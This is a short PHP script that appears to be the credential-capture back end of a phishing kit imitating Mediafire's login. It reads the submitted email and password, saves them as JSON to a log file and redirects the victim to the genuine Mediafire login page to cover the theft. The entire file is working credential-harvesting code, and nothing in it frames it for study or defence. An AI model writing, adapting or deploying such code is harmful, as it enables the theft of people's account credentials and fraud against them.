<?php

header('Location: https://www.mediafire.com/login/');
$data = array('site' => 'Mediafire',
  'user' => $_POST['login_email'],
  'pass' => $_POST['login_pass']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>